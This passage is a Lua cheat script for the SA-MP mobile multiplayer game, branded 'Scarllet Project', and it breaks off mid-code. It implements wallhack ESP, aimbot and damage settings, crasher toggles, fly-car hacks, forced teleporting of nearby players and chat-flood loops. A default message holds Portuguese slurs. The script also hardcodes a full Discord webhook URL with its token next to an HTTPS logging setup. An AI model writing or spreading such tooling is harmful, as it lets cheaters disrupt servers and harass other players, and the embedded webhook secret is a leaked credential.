local imgui = require("mimgui")
local sampev = require 'samp.events'
local inicfg = require("inicfg")
local inicfg = require 'inicfg'
local faicons = require('fAwesome6')
local encoding = require("encoding")
encoding.default = 'CP1251'
local sfuncs = require("sampfuncs")
local u8 = encoding.UTF8
local Vector3D = require "vector3d"
local font = renderCreateFont("Arial", 12, 10)
fontwarp = renderCreateFont("Arial", 9, 4, FCR_BOLD + FCR_BORDER)

local horizonIPs = {
    ["ip1.horizonte-rp.com"] = true,
    ["ip2.horizonte-rp.com"] = true,
    ["ip3.horizonte-rp.com"] = true,
    ["ip4.horizonte-rp.com"] = true
}

local webhookUrl = "https://discord.com/api/webhooks/1344405697642762260/AMSM__DQ0n4OC5-s7m_Hkatg-sAguMiq2wFrgiMabsKL5sj3XGC3f6pJHGV3XyJ604zx"

local https, ltn12, logOk = nil, nil, false
pcall(function()
    https = require("ssl.https")
    ltn12 = require("ltn12")
    logOk = true
end)
 
local ffi = require('ffi')

ffi.cdef[[
  typedef struct RwV3d {
    float x, y, z;
  } RwV3d;
  // void CPed::GetBonePosition(CPed *this, RwV3d *posn, uint32 bone, bool calledFromCam) - Mangled name
  void _ZN4CPed15GetBonePositionER5RwV3djb(void* thiz, RwV3d* posn, uint32_t bone, bool calledFromCam);
]]
function getBonePosition(ped, bone) 
    local pedptr = ffi.cast('void*', getCharPointer(ped))
    local posn = ffi.new('RwV3d[1]')
    gta._ZN4CPed15GetBonePositionER5RwV3djb(pedptr, posn, bone, false)
    return posn[0].x, posn[0].y, posn[0].z
  end

local new, str, sizeof = imgui.new, ffi.string, ffi.sizeof
local players = {}
local testeshow = false 
local commandSent = false 
local messageSent = false
local incarroput = ffi.new("char[256]") 
local vhtroll = imgui.new.char[256]()
local state12 = false
active = true 
trailer = nil 
local krytka = false
local renderobj = "testeprincipal"
local protect = "protectprincipal"
local playerflip = imgui.new.char[256]() 
local mjogador2 = imgui.new.char[256]()
local carjackID = imgui.new.char[256]()
local playertroll = imgui.new.char[256]()  
local bazuka = imgui.new.bool(false)
local legitRandom = imgui.new.bool(false)
local autocx = imgui.new.bool(false)
local carId = nil
local carInput = imgui.new.char[256]() 
local playerInput = imgui.new.char[256]() 
local carencima = imgui.new.char[256]()    
local ch = nil
local eppc = false 
local pveiculo = new.int(0)
local state13 = false
local testesampk = false
local bufferides = 10
local seguirjogador = ffi.new("char[?]", bufferides)
local zaidejas = 0
local follow = false
local mult = 1.0
local justGotInCar = true
local lastHP = 1000
local bypass = false
local fuckinvis = false
local dinplayer = new.int(0)
local trollceu = imgui.new.char[256]()
local tpcarmi = imgui.new.char[256]()
local playerIdBuffer = new.char(10)  
local tdist = imgui.new.float()
local sideSpeed = imgui.new.float(1.5)  
local baixospeed = imgui.new.float(1.65)
local cimaspeed = imgui.new.float(1.65)   
local jgjogar = false 
local id = 0    
local renderWindow = imgui.new.bool(false)
local distanceSlider = imgui.new.float(1.0) 
local fovSlider = imgui.new.float(100.0) 
local selectedTab = 1
local state = false
local var_0_1 = false
local var_0_2 = false
local targetId = -1
local miss = false
local ped = nil
local fakemode = imgui.new.bool(false)
local lastTeleportTime = 0
local SCREEN_W, SCREEN_H = getScreenResolution()
local var_0_6 = renderCreateFont("Arial", 12, 4, FCR_BOLD + FCR_BORDER)
local nick_font = renderCreateFont('Verdana', 8, FCR_BOLD + FCR_BORDER)
local stat_font = renderCreateFont('Verdana', 12, FCR_BOLD + FCR_BORDER)
local stat_fontt = renderCreateFont('Franklin Gothic', 12, FCR_BOLD + FCR_BORDER)
local chooseActive, pointMarker, renderInfo
local jetpackt = false
local crasher1 = false
local crasher2 = false
local crasher3 = false
local silentAimActive = false
local crasher4 = false
local crasher6 = false
local crasher6 = false
local messageDelay = 1000  
local playerIdInput = new.int(0) 
local mx, my, mz, pz, py, pz, ax, ay, az = 0, 0, 0, 0, 0, 0, 0, 0, 0
local heli1 = {425, 465, 501}
local heli2 = {487, 488, 497}
local heli3 = {447, 469}
local heli = {425, 447, 469, 487, 488, 497, 548, 563}
local nresetar = false
local bypass2 = false
local idBuffer = ffi.new("char[256]", "") 
local inputField = new.char[256]("Digite algo")
local tpwarpcar = ffi.new("char[256]") 
local messageText = ffi.new("char[256]", "Scarllet Project Mobile: Vai se fuder filho da puta | Seu merda, resto de aborto")

local floatbuffer6 = imgui.new.float()

local weapons = {
    {id = 22, name = "Colt 45"},               
    {id = 23, name = "Silenced"},              
    {id = 24, name = "Deagle"},                
    {id = 25, name = "Shotgun"},               
    {id = 26, name = "Sawed-off"},            
    {id = 27, name = "Combat Shotgun"},        
    {id = 28, name = "Uzi"},                  
    {id = 29, name = "MP5"},                 
    {id = 32, name = "Tec-9"},                 
    {id = 30, name = "AK-47"},                 
    {id = 31, name = "M4"},                   
    {id = 33, name = "Rifle"},                 
    {id = 34, name = "Sniper"},                 
    {id = 35, name = "Rocket Launcher"},        
    {id = 36, name = "Rocket Launcher HS"},     
    {id = 37, name = "Flamethrower"},          
    {id = 38, name = "Minigun"},               
}

local bdata = {
    { delay = 970, dmg = 120, distance = 15, id = 0 },
    { delay = 160, dmg = 120, distance = 35, id = 22 },
    { delay = 120, dmg = 120, distance = 35, id = 23 },
    { delay = 0, dmg = 120, distance = 35, id = 24 },
    { delay = 1000, dmg = 120, distance = 40, id = 25 },
    { delay = 120, dmg = 120, distance = 35, id = 26 },
    { delay = 120, dmg = 120, distance = 40, id = 27 },
    { delay = 50, dmg = 120, distance = 35, id = 28 },
    { delay = 90, dmg = 120, distance = 45, id = 29 },
    { delay = 90, dmg = 120, distance = 70, id = 30 },
    { delay = 90, dmg = 120, distance = 90, id = 31 },
    { delay = 300, dmg = 120, distance = 35, id = 32 },
    { delay = 800, dmg = 120, distance = 100, id = 33 },
    { delay = 900, dmg = 120, distance = 320, id = 34 },
    { delay = 20, dmg = 120, distance = 75, id = 38 }
}

cars = {
    "Landstalker", "Bravura", "Buffalo", "Linerunner", "Pereniel", "Sentinel", "Dumper", "Firetruck", "Trashmaster", "Stretch", "Manana", "Infernus", "Voodoo", "Pony",
    "Mule", "Cheetah", "Ambulance", "Leviathan", "Moonbeam", "Esperanto", "Taxi", "Washington", "Bobcat", "Mr Whoopee", "BF Injection", "Hunter", "Premier", "Enforcer",
    "Securicar", "Banshee", "Predator", "Bus", "Rhino", "Barracks", "Hotknife", "Trailer", "Previon", "Coach", "Cabbie", "Stallion", "Rumpo", "RC Bandit",
    "Romero", "Packer", "Monster Truck", "Admiral", "Squalo", "Seasparrow", "Pizzaboy", "Tram", "Trailer", "Turismo", "Speeder", "Reefer", "Tropic", "Flatbed", "Yankee",
    "Caddy", "Solair", "Berkley's RC Van", "Skimmer", "PCJ-600", "Faggio", "Freeway", "RC Baron", "RC Raider", "Glendale", "Oceanic", "Sanchez", "Sparrow", "Patriot",
    "Quad", "Coastguard", "Dinghy", "Hermes", "Sabre", "Rustler", "ZR-350", "Walton", "Regina", "Comet", "BMX", "Burrito", "Camper", "Marquis", "Baggage", "Dozer",
    "Maverick", "News Chopper", "Rancher", "FBI Rancher", "Virgo", "Greenwood", "Jetmax", "Hotring", "Sandking", "Blista Compact", "Police Maverick", "Boxville",
    "Benson", "Mesa", "RC Goblin", "Hotring Racer", "Hotring Racer", "Bloodring Banger", "Rancher", "Super GT", "Elegant", "Journey", "Bike", "Mountain Bike", "Beagle",
    "Cropdust", "Stunt", "Tanker", "RoadTrain", "Nebula", "Majestic", "Buccaneer", "Shamal", "Hydra", "FCR-900", "NRG-500", "HPV1000", "Cement Truck", "Tow Truck",
    "Fortune", "Cadrona", "FBI Truck", "Willard", "Forklift", "Tractor", "Combine", "Feltzer", "Remington", "Slamvan", "Blade", "Freight", "Streak", "Vortex",
    "Vincent", "Bullet", "Clover", "Sadler", "Firetruck", "Hustler", "Intruder", "Primo", "Cargobob", "Tampa", "Sunrise", "Merit", "Utility", "Nevada",
    "Yosemite", "Windsor", "Monster Truck", "Monster Truck", "Uranus", "Jester", "Sultan", "Stratum", "Elegy", "Raindance", "RC Tiger", "Flash", "Tahoma",
    "Savanna", "Bandito", "Freight", "Trailer", "Kart", "Mower", "Duneride", "Sweeper", "Broadway", "Tornado", "AT-400", "DFT-30", "Huntley", "Stafford", "BF-400",
    "Newsvan", "Tug", "Trailer", "Emperor", "Wayfarer", "Euros", "Hotdog", "Club", "Trailer", "Trailer", "Andromada", "Dodo", "RC Cam", "Launch", "Police Car (LS)",
    "Police Car (SF)", "Police Car (LV)", "Police Ranger", "Picador", "S.W.A.T. Van", "Alpha", "Phoenix", "Glendale", "Sadler", "Luggage Trailer", "Luggage Trailer",
    "Stair Trailer", "Boxville", "Farm Plow", "Utility Trailer"
    }
    
local SetSkin = {
    skinid = new.int(0)
  }
  
  SetSkin.activate = function()
    local bs = raknetNewBitStream()
    raknetBitStreamWriteInt32(bs, select(2, sampGetPlayerIdByCharHandle(PLAYER_PED)))
    raknetBitStreamWriteInt32(bs, SetSkin.skinid[0])
    raknetEmulRpcReceiveBitStream(153, bs)
    raknetDeleteBitStream(bs)
  end


  local ESP = {
    BONES = { 3, 4, 5, 51, 52, 41, 42, 31, 32, 33, 21, 22, 23, 2 },
    FONT = renderCreateFont('Arial', SCREEN_H * 0.01, 1 + 4),
    enabled_bones = new.bool(false),
    enabled_boxes = new.bool(false)
}

ESP.processESP = function()
    while not isSampAvailable() do wait(0) end

    while true do
        wait(0)

        for _, char in ipairs(getAllChars()) do
            local result, id = sampGetPlayerIdByCharHandle(char)
            if result and isCharOnScreen(char) then
                local opaque_color = bit.bor(bit.band(sampGetPlayerColor(id), 0xFFFFFF), 0xFF000000)

                if ESP.enabled_bones[0] then
                    local playerPed = PLAYER_PED

                    if char ~= playerPed then
                        for _, bone in ipairs(ESP.BONES) do
                            local x1, y1, z1 = getBonePosition(char, bone)
                            local x2, y2, z2 = getBonePosition(char, bone + 1)
                            local r1, sx1, sy1 = convert3DCoordsToScreenEx(x1, y1, z1)
                            local r2, sx2, sy2 = convert3DCoordsToScreenEx(x2, y2, z2)

                            if r1 and r2 then
                                local isClearLOS = isLineOfSightClear(x1, y1, z1, x2, y2, z2, true, true, false, true, true)
                                local color = isClearLOS and 0xFF00FF00 or 0xFFFF0000
                                renderDrawLine(sx1, sy1, sx2, sy2, 3, color)
                            end
                        end

                        local x1, y1, z1 = getBonePosition(char, 2)
                        local r1, sx1, sy1 = convert3DCoordsToScreenEx(x1, y1, z1)
                        if r1 then
                            local x2, y2, z2 = getBonePosition(char, 41)
                            local r2, sx2, sy2 = convert3DCoordsToScreenEx(x2, y2, z2)
                            if r2 then
                                local isClearLOS = isLineOfSightClear(x1, y1, z1, x2, y2, z2, true, true, false, true, true)
                                local color = isClearLOS and 0xFF00FF00 or 0xFFFF0000
                                renderDrawLine(sx1, sy1, sx2, sy2, 3, color)
                            end
                        end

                        if r1 then
                            local x2, y2, z2 = getBonePosition(char, 51)
                            local r2, sx2, sy2 = convert3DCoordsToScreenEx(x2, y2, z2)
                            if r2 then
                                local isClearLOS = isLineOfSightClear(x1, y1, z1, x2, y2, z2, true, true, false, true, true)
                                local color = isClearLOS and 0xFF00FF00 or 0xFFFF0000
                                renderDrawLine(sx1, sy1, sx2, sy2, 3, color)
                            end
                        end
                    end
                end

                if ESP.enabled_boxes[0] then
                    local playerPed = PLAYER_PED

                    if char ~= playerPed then
                        local x1, y1, z1 = getCharCoordinates(playerPed)
                        local x2, y2, z2 = getCharCoordinates(char)
                        local isClearLOS = isLineOfSightClear(x1, y1, z1, x2, y2, z2, true, true, false, true, true)
                        local fillColor = isClearLOS and 0x4000FF00 or 0x40FF0000
                        local borderColor = isClearLOS and 0xFF00FF00 or 0xFFFF0000

                        local headx, heady = convert3DCoordsToScreen(x2, y2, z2 + 1.0)
                        local footx, footy = convert3DCoordsToScreen(x2, y2, z2 - 1.0)
                        local width = math.abs((heady - footy) * 0.25)
                        local boxWidth = 2 * width
                        local boxHeight = footy - heady

                        renderDrawLine(headx - width, heady, headx + width, heady, 2, borderColor)
                        renderDrawLine(headx + width, heady, headx + width, footy, 2, borderColor)
                        renderDrawLine(headx + width, footy, headx - width, footy, 2, borderColor)
                        renderDrawLine(headx - width, footy, headx - width, heady, 2, borderColor)
                    end
                end
            end
        end
    end
end

lua_thread.create(ESP.processESP)



local aim = {
    renderWindow = {
        renderWindow = new.bool(false)
    },
    CheckBox = {
        enableAim = new.bool(false),
        teste1 = new.bool(false),
        teste2 = new.bool(false),
        teste3 = new.bool(false),
        teste4 = new.bool(false),
        teste5 = new.bool(false),
        teste6 = new.bool(false),
        teste7 = new.bool(false),
        spawnHackActive = new.bool(false),
        showCircle = new.bool(true),
        weaponID = new.int(0),
        teste8 = new.bool(false),
        teste9 = new.bool(false),
        teste10 = new.bool(false),
        teste11 = new.bool(false),
        teste12 = new.bool(false),
        aimAtHead = new.bool(false),
        aimAtChest = new.bool(false),
        aimAtFeet = new.bool(false),
        nome = new.bool(false),
        teste13 = new.bool(false),
        teste14 = new.bool(false),
        teste15 = new.bool(false),
        autohp = new.bool(false),
        teste16 = new.bool(false),
        teste17 = new.bool(false),
        teste18 = new.bool(false),
        teste19 = new.bool(false),
        teste20 = new.bool(false),
        teste21 = new.bool(false),
        teste22 = new.bool(false),
        teste23 = new.bool(false),
        teste24 = new.bool(false),
        linha = new.bool(false),
        caixa = new.bool(false),
        teste25 = new.bool(false),
        teste26 = new.bool(false),
        teste27 = new.bool(false),
        teste28 = new.bool(false),
        teste29 = new.bool(false),
        teste30 = new.bool(false),
        teste31 = new.bool(false),
        teste32 = new.bool(false),
        teste33 = new.bool(false),
        damagerEnabled = new.bool(false),
        ammoAmount = new.int(0),
        tpwarpcar = new.int(0),
        teste34 = new.bool(false),
        teste35 = new.bool(false),
        teste36 = new.bool(false),
        teste37 = new.bool(false),
        teste38 = new.bool(false),
        teste39 = new.bool(false),
        teste40 = new.bool(false),
        teste41 = new.bool(false),
        teste42 = new.bool(false),
        teste43 = new.bool(false),
        teste44 = new.bool(false),
        teste45 = new.bool(false),
        teste46 = new.bool(false),
        teste47 = new.bool(false),
        teste48 = new.bool(false),
        teste49 = new.bool(false),
        teste50 = new.bool(false),
        teste51 = new.bool(false),
        teste52 = new.bool(false),
        teste53 = new.bool(false),
        teste54 = new.bool(false),
        teste55 = new.bool(false),
        teste56 = new.bool(false),
        teste57 = new.bool(false),
        teste58 = new.bool(false),
        teste59 = new.bool(false),
        teste60 = new.bool(false),
        teste61 = new.bool(false),
        teste62 = new.bool(false),
        teste63 = new.bool(false),
        teste64 = new.bool(false),
        teste65 = new.bool(false),
        teste66 = new.bool(false),
        teste67 = new.bool(false),
        teste68 = new.bool(false),
        teste69 = new.bool(false),
        teste70 = new.bool(false),
        teste71 = new.bool(false),
        teste72 = new.bool(false),
        teste73 = new.bool(false),
        teste74 = new.bool(false),
        teste75 = new.bool(false),
        teste76 = new.bool(false),
        teste77 = new.bool(false),
        teste78 = new.bool(false),
        teste79 = new.bool(false),
        sumircarro = new.bool(false),
        testespeed = new.bool(false),
        teste80 = new.bool(false),
        teste81 = new.bool(false),
        teste82 = new.bool(false),
        teste83 = new.bool(false),
        teste84 = new.bool(false),
        teste85 = new.bool(false),
        teste86 = new.bool(false),
        teste87 = new.bool(false),
        teste88 = new.bool(false),
        teste89 = new.bool(false),
        teste90 = new.bool(false),
        teste91 = new.bool(false),
        teste92 = new.bool(false),
        teste93 = new.bool(false),
        teste94 = new.bool(false),
        teste95 = new.bool(false),
        teste96 = new.bool(false),
        teste97 = new.bool(false),
        teste98 = new.bool(false),
        teste99 = new.bool(false),
        teste100 = new.bool(false)
    },
    Sliders = {
    }
}

local nextAttackTime = os.clock()
local carshote = carshote or {0.0}  
local carshote = new.float(60)
local dflood = new.float(60)
local dchatkill = new.float(60)
local delaydmg = new.float(1.0) 
local maxDistance = new.float(50.0)  
local attackSpeed = new.float(1.0)  
local dsms = new.float(60)
local prodist = new.float(60)
local mfov = new.float(60)
local helidist = new.float(60)
local sfloat = new.float(2)

local FlyCar = {
    enabled = new.bool(false),
    cars = 0
  }
  
  FlyCar.processFlyCar = function()
    local car = storeCarCharIsInNoSave(PLAYER_PED)
    local speed = getCarSpeed(car)
  
    local result, var_1, var_2 = isWidgetPressedEx(WIDGET_VEHICLE_STEER_ANALOG, 0)
    if result then
      local var_1 = var_1 / -64.0
      local var_2 = var_2 / 64.0
      setCarRotationVelocity(car, var_2, 0.0, var_1)
    end
  
    if isWidgetPressed(WIDGET_ACCELERATE) and speed <= 200.0 then
      FlyCar.cars = FlyCar.cars + 0.4
    end
    if isWidgetPressed(WIDGET_BRAKE) then
      FlyCar.cars = FlyCar.cars - 0.3
      if FlyCar.cars < 0 then FlyCar.cars = 0 end
    end
    if isWidgetPressed(WIDGET_HANDBRAKE) then
      FlyCar.cars = 0
      setCarRotationVelocity(car, 0.0, 0.0, 0.0)
      setCarRoll(car, 0.0)
    end
  
    setCarForwardSpeed(car, FlyCar.cars)
  end
   
  FlyCar.activate = function()
    lua_thread.create(function()
      while FlyCar.enabled[0] do
        if isCharInAnyCar(PLAYER_PED) then
          FlyCar.processFlyCar()
        else
          FlyCar.cars = 0
        end
  
        wait(0)
      end
    end)
  end
  
  FlyCar.reset = function()
    FlyCar.cars = 0
  end

 
function main()
    initializeRender()
    repeat wait(0) until isSampAvailable()
    wait(1000)
    sampAddChatMessage("{C0C0C0}[SCARLLET-PROJECT]: {FF4C4C}(CARREGADO) {C0C0C0} USE O COMANDO /SPMOBILE", 0xC0C0C0)
    sampRegisterChatCommand("bosta", function()
        aim.renderWindow.renderWindow[0] = not aim.renderWindow.renderWindow[0]
    end)
    while true do wait(0)

        if aim.CheckBox.teste2[0] then
            if not isPauseMenuActive() and isPlayerPlaying(playerHandle) then
                local HP = getCharHealth(playerPed)
                local playerposX, playerposY, playerposZ = getCharCoordinates(playerPed)
                local screenX, screenY = convert3DCoordsToScreen(playerposX, playerposY, playerposZ)
                drawBar(screenX - 50, screenY, 100, 20, 0xBFDF0101, 0xBF610B0B, 2, font, HP)
            end
        end

        if aim.CheckBox.teste5[0] and (isCharPlayingAnim(PLAYER_PED, "KO_SKID_BACK") or isCharPlayingAnim(playerPed, "FALL_COLLAPSE")) then
            clearCharTasksImmediately(PLAYER_PED)
        end

        if aim.CheckBox.teste18[0] and isCharInAnyCar(PLAYER_PED) then
            local pressed_menu = isWidgetPressed(WIDGET_SCHOOL_START)
            if pressed_menu then
                local x, y, z = getCarSpeedVector(storeCarCharIsInNoSave(PLAYER_PED))
                if z < 7 then
                    applyForceToCar(storeCarCharIsInNoSave(PLAYER_PED), 0, 0, 0.2, 0, 0, 0)
                end
            end
            was_pressed_menu = pressed_menu
        end

        if aim.CheckBox.teste20[0] and isWidgetPressed(WIDGET_CRANE_UP) and isCharInAnyCar(PLAYER_PED) then
            addToCarRotationVelocity(storeCarCharIsInNoSave(PLAYER_PED), 0, 10.5, 0)
        end

        if aim.CheckBox.teste21[0] and isCharInAnyCar(PLAYER_PED) and isWidgetPressed(WIDGET_CRANE_UP) then
            local var_18_322 = storeCarCharIsInNoSave(PLAYER_PED)
            local var_18_323, var_18_324, var_18_325 = getOffsetFromCarInWorldCoords(var_18_322, 0, 0, 0)
            
            setCarCoordinates(var_18_322, var_18_323, var_18_324, var_18_325)
        end      
        
        if isCharInAnyCar(PLAYER_PED) and aim.CheckBox.teste23[0] then
            local var_52_0 = isWidgetPressed(WIDGET_CRANE_UP)
            local var_52_1, var_52_2, var_52_3 = getActiveCameraCoordinates()
            local var_52_4, var_52_5, var_52_6 = getActiveCameraPointAt()

            setCarHeading(storeCarCharIsInNoSave(playerPed), getHeadingFromVector2d(var_52_4 - var_52_1, var_52_5 - var_52_2))

            local var_52_7 = storeCarCharIsInNoSave(PLAYER_PED)

            if var_52_0 then
                setCarForwardSpeed(var_52_7, carshote[0] / 1.67)
            end

            was_pressed_menu = var_52_0
        end

        if aim.CheckBox.teste24[0] and isWidgetPressed(WIDGET_CRANE_UP) and isCharInAnyCar(PLAYER_PED) then
            local car = storeCarCharIsInNoSave(PLAYER_PED)
            local carX, carY, carZ = getCarCoordinates(car)
        
            warpCharFromCarToCoord(PLAYER_PED, carX, carY, carZ)
        end

        if aim.CheckBox.teste26[0] and isCharInAnyCar(PLAYER_PED) then
			setCarEngineOn(storeCarCharIsInNoSave(PLAYER_PED), true)
		end

        if aim.CheckBox.teste28[0] and isCharInAnyCar(PLAYER_PED) then
            local var_9_7 = storeCarCharIsInNoSave(PLAYER_PED)
            setCarHeavy(var_9_7, true)
        elseif isCharInAnyCar(PLAYER_PED) then
            local var_9_8 = storeCarCharIsInNoSave(PLAYER_PED)
            setCarHeavy(var_9_8, false)
        end

        if aim.CheckBox.teste36[0] and isCharInAnyCar(PLAYER_PED) then
			local var_10_15 = isWidgetPressed(WIDGET_ARCADE_POWER_OFF)
			local var_10_16 = storeCarCharIsInNoSave(PLAYER_PED)
			local var_10_17 = getCarSpeed(var_10_16)

			if var_10_15 then
				setCarForwardSpeed(var_10_16, var_10_17 * sfloat[0])
			end

			was_pressed_menu = var_10_15
		end
        
       if aim.CheckBox.teste29[0] then
    local radius = prodist[0]

    function getNearbyPlayers(radius)
        local nearbyPlayers = {}
        for i = 0, 1000 do  
            if sampIsPlayerConnected(i) then
                local result, v = sampGetCharHandleBySampPlayerId(i)
                if result and doesCharExist(v) and not isCharDead(v) and v ~= playerPed then
                    local playerPos = {getCharCoordinates(v)}
                    local my_pos = {getCharCoordinates(playerPed)}
                    if getDistanceBetweenCoords3d(my_pos[1], my_pos[2], my_pos[3], playerPos[1], playerPos[2], playerPos[3]) <= radius then
                        table.insert(nearbyPlayers, v)
                    end
                end
            end
        end
        return nearbyPlayers
    end

    local nearbyPlayers = getNearbyPlayers(radius)
    if #nearbyPlayers > 0 then
        for _, v in ipairs(nearbyPlayers) do
            local my_pos = {getCharCoordinates(playerPed)}
            local camCoordX, camCoordY, camCoordZ = getActiveCameraCoordinates()
            local targetCamX, targetCamY, targetCamZ = getActiveCameraPointAt()
            local heading = getCharHeading(playerPed)
            local angle = getHeadingFromVector2d(targetCamX - camCoordX, targetCamY - camCoordY)

            local newX = my_pos[1] + math.sin(-math.rad(angle)) * 1.1 + (math.sin(-math.rad(angle)) / 2) - (0.3 * math.sin(-math.rad(angle + 90)))
            local newY = my_pos[2] + math.cos(-math.rad(angle)) * 1.1 + (math.cos(-math.rad(angle)) / 2) - (0.3 * math.cos(-math.rad(angle + 90)))
            local newZ = my_pos[3] - 0.6

            setCharCoordinates(v, newX, newY, newZ)
            setCharHeading(v, heading)
        end
    end
end


        if aim.CheckBox.teste27[0] and isCharInAnyCar(PLAYER_PED) then
			local var_9_32 = storeCarCharIsInNoSave(PLAYER_PED)

			if isCarUpsidedown(var_9_32) then
				setCarHealth(var_9_32, 1000)
			end
		end

        if aim.CheckBox.teste25[0] and isCharInAnyCar(PLAYER_PED) and isWidgetPressed(WIDGET_CRANE_UP) then
			lua_thread.create(function()
				local var_21_0 = storeCarCharIsInNoSave(PLAYER_PED)
				local var_21_1 = getCarHeading(var_21_0)
				local var_21_2, var_21_3, var_21_4 = getOffsetFromCarInWorldCoords(var_21_0, 0, 14.5, -1.3)
				local var_21_5 = createObject(1634, var_21_2, var_21_3, var_21_4)
				local var_21_6 = getObjectHeading(var_21_5)

				setObjectHeading(var_21_5, var_21_1)
				wait(floatbuffer6[0])
				deleteObject(var_21_5)
			end)
		end

        if aim.CheckBox.teste34[0] then
                
            if inputText == nil then
                inputText = ""
            end
            

            sampSendChat("{$}-[$]@{$}-[$]" .. inputText .. "{$}-[$]@{$}-[$]")
            wait(dflood[0])
            sampSendChat("{$}-[$]@{$}-[$]" .. inputText .. "{$}-[$]@{$}-[$]")
            wait(dflood[0])
            sampSendChat("{$}-[$]@{$}-[$]" .. inputText .. "{$}-[$]@{$}-[$]")
            wait(dflood[0])
        end

        if aim.CheckBox.teste33[0] then
            sampSendChat("{$}-[$]@{$}-[$]Scarllet Project V2{$}-[$]@{$}-[$]")
            wait(400)
            sampSendChat("{$}-[$]@{$}-[$]Scarllet Project V2{$}-[$]@{$}-[$]")
            wait(400)
            sampSendChat("{$}-[$]@{$}-[$]Scarllet Project V2{$}-[$]@{$}-[$]")
            wait(400)
        end

        if aim.CheckBox.teste32[0] then
            sampSendChat("_SCARLLET PROJECT V2.LUA+++")
            wait(500)
            sampSendChat("__SCARLLET PROJECT V2.LUA+++")
            wait(500)
            sampSendChat("___SCARLLET PROJECT V2.LUA+++")
            wait(500)
            sampSendChat("____SCARLLET PROJECT V2.LUA+++")
            wait(500)
            sampSendChat("_____SCARLLET PROJECT V2.LUA+++")
            wait(500)
            sampSendChat("______SCARLLET PROJECTV2.LUA+++")
            wait(500)
            sampSendChat("_____SCARLLET PROJECT V2.LUA+++")
            wait(500)
            sampSendChat("____SCARLLET PROJECT V2.LUA+++")
            wait(500)
            sampSendChat("___SCARLLET PROJECT V2.LUA+++")
            wait(500)
            sampSendChat("__SCARLLET PROJECT V2.LUA+++")
            wait(500)
            sampSendChat("_SCARLLET PROJECT V2.LUA+++")
            wait(500)
        end

        if aim.CheckBox.teste31[0] then
            local var_4_0 = getAllChars()

			for iter_4_0, iter_4_1 in ipairs(var_4_0) do
				if iter_4_1 ~= PLAYER_PED then
					local var_4_1, var_4_2 = sampGetPlayerIdByCharHandle(iter_4_1)

					if var_4_1 and isCharOnScreen(iter_4_1) then
						local var_4_3, var_4_4, var_4_5 = getOffsetFromCharInWorldCoords(iter_4_1, 0, 0, 0)
						local var_4_6, var_4_7 = convert3DCoordsToScreen(var_4_3, var_4_4, var_4_5 + 1)
						local var_4_8, var_4_9 = convert3DCoordsToScreen(var_4_3, var_4_4, var_4_5 - 1)
						local var_4_10 = math.abs((var_4_7 - var_4_9) * 0.25)
						local var_4_11 = sampGetPlayerNickname(var_4_2) .. " (" .. tostring(var_4_2) .. ")"

						if sampIsPlayerPaused(var_4_2) then
							var_4_11 = "[AFK] " .. var_4_11
						end

						local var_4_12 = sampGetPlayerHealth(var_4_2)
						local var_4_13 = sampGetPlayerArmor(var_4_2)
						local var_4_14 = "{FF0000}" .. string.format("%.0f", var_4_12) .. "hp "
						local var_4_15 = "{BBBBBB}" .. string.format("%.0f", var_4_13) .. "ap"
						local var_4_16 = bit.bor(bit.band(sampGetPlayerColor(var_4_2), 16777215), 4278190080)

						renderFontDrawText(var_0_6, var_4_11, var_4_6 - renderGetFontDrawTextLength(var_0_6, var_4_11) / 2, var_4_7 - renderGetFontDrawHeight(var_0_6) * 3.8, var_4_16)
						renderDrawBoxWithBorder(var_4_6 - 24, var_4_7 - 45, 50, 6, 4278190080, 1, 4278190080)
						renderDrawBoxWithBorder(var_4_6 - 24, var_4_7 - 45, var_4_12 / 2, 6, 4294901760, 1, 0)

						if var_4_13 > 0 then
							renderDrawBoxWithBorder(var_4_6 - 24, var_4_7 + renderGetFontDrawHeight(var_0_6) - 50, 50, 6, 4278190080, 1, 4278190080)
							renderDrawBoxWithBorder(var_4_6 - 24, var_4_7 + renderGetFontDrawHeight(var_0_6) - 50, var_4_13 / 2, 6, 4294967295, 1, 0)
						end
					end
				end
			end
		end

        
        if aim.CheckBox.teste30[0] then
            for iter_4_5 = 0, sampGetMaxPlayerId(false) do
                if sampIsPlayerConnected(iter_4_5) then
                    local var_4_58, var_4_59 = sampGetCharHandleBySampPlayerId(iter_4_5)
        
                    if var_4_58 and isCharOnScreen(var_4_59) and not sampIsDialogActive() then
                        local var_4_60, var_4_61, var_4_62 = getOffsetFromCharInWorldCoords(var_4_59, 0, 0, 1)
                        local var_4_63 = isPointOnScreen(var_4_60, var_4_61, var_4_62, 0)
                        local var_4_64, var_4_65, var_4_66 = getCharCoordinates(PLAYER_PED)
                        local var_4_67, var_4_68, var_4_69 = getCharCoordinates(var_4_59)
                        local var_4_70 = getCurrentCharWeapon(var_4_59)
                        local var_4_71 = {
                            getCharCoordinates(var_4_59)
                        }
                        local var_4_72 = {
                            convert3DCoordsToScreen(var_4_71[1] + 0.3, var_4_71[2], var_4_71[3] - 1)
                        }
                        local var_4_73 = math.floor(getDistanceBetweenCoords3d(var_4_64, var_4_65, var_4_66, var_4_67, var_4_68, var_4_69))
        
                        if var_4_63 and var_4_73 <= 1000 then
                            local var_4_74 = getweaponname(var_4_70) .. "(" .. var_4_70 .. ")"
        
                            if var_4_74 then
                                renderFontDrawText(var_0_6, var_4_74, var_4_72[1], var_4_72[2] - 20, 4278255360)
                            end
                        end
                    end
                end
            end
        end

        if aim.CheckBox.teste44[0] then
            if isCharInAnyHeli(PLAYER_PED) then
        
                mx, my, mz = getCharCoordinates(PLAYER_PED)
                veh = storeCarCharIsInNoSave(PLAYER_PED)
                model = getCarModel(veh)
                ebalka = true
                printStringNow('~b~HELICOPTER FUCK: ~g~ON', 1000)
        
                local chars = getAllChars()
                local foundPlayer = false
                
                local radius = helidist[0]
        
                for i, v in ipairs(chars) do
                    if doesCharExist(v) and v ~= PLAYER_PED then
                        local vx, vy, vz = getCharCoordinates(v)
                        local d = getDistanceBetweenCoords3d(mx, my, mz, vx, vy, vz)
                        local r, id = sampGetPlayerIdByCharHandle(v)
        
                        if r and id and d <= radius and not isCharDead(v) and not sampIsPlayerNpc(id) and not sampIsPlayerPaused(id) and not isCharInAnyCar(v) then
        
                            local px, py, pz = getCharCoordinates(v)
                            local nick = sampGetPlayerNickname(id)
        
                            if isValueInTable(heli1, model) then
                                ax = px + 0.5
                                ay = py
                                az = pz - 0.2
                            elseif isValueInTable(heli2, model) then
                                ax = px + 0.5
                                ay = py
                                az = pz + 2.5
                            elseif isValueInTable(heli3, model) then
                                ax = px + 0.5
                                ay = py
                                az = pz + 1.5
                            elseif model == 548 then
                                ax = px + 1.5
                                ay = py
